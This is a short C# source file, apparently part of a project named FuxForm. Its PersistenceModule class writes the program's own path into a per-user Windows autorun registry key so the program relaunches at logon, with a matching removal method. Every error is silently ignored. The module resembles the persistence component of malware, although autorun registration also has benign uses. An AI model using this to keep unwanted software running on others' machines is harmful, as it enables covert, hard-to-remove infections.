using Microsoft.Win32;

namespace FuxForm.Algorithms
{
    internal class PersistenceModule
    {
        public static void AddPersistence()
        {
            try
            {
                string executablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(config.AutorunKey, true))
                {
                    if (key?.GetValue(config.AutorunValue) == null)
                    {
                        using (RegistryKey runKey = Registry.CurrentUser.CreateSubKey(config.AutorunKey))
                        {
                            runKey?.SetValue(config.AutorunValue, executablePath);
                        }
                    }
                }
            }
            catch { }
        }

        public static void RemovePersistence()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(config.AutorunKey, true))
                {
                    if (key != null && key.GetValue(config.AutorunValue) != null)
                    {
                        key.DeleteValue(config.AutorunValue);
                    }
                }
            }
            catch { }
        }
    }
}
